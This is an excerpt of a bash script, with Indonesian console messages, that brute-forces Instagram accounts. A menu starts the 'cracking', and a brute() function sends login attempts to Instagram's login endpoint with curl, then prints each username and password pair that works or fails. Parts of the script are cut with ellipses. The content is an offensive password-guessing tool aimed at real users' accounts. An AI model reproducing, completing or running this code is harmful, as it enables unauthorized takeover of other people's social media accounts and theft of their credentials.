...
case $opt in
    1) #menu 1
        ...
        echo -e "${white}[${yellow}!${white}] ${red}Memulai cracking...${white}"
        ;;
    2) #menu 2
...
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    ...
                    if [[ $login =~ "true" ]]; then
                            echo -e "[${green}+${white}] ${yellow}Anjoy Dapet Cok! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                        elif [[ $login =~ "false" ]]; then
                                    echo -e "[${red}!${white}] @$i - ${red}Gagal Cracking${white}"
